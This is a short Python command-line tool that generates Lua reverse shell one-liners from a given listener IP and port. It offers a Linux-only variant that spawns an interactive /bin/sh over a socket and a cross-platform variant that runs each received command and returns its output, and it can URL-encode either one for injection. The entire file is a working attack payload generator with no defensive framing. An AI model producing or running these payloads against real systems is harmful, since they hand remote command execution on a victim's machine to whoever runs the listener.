import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("-v", "--variant", default="1", type=click.Choice(["1", "2"]),
              help="1=Linux only (default), 2=Windows+Linux")
def command(listener_ip, listener_port, raw, urlencode, variant):
    """Return Lua reverse shell"""
    if variant == "1":
        label = "Lua reverse shell (Linux)"
        cmd = (f"lua -e \"require('socket');require('os');t=socket.tcp();"
               f"t:connect('{listener_ip}','{listener_port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"")
    else:
        label = "Lua reverse shell (Windows+Linux)"
        cmd = (f"lua5.1 -e 'local host, port = \"{listener_ip}\", {listener_port} "
               f"local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") "
               f"tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() "
               f"local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) "
               f"if status == \"closed\" then break end end tcp:close()'")
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}{label}:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
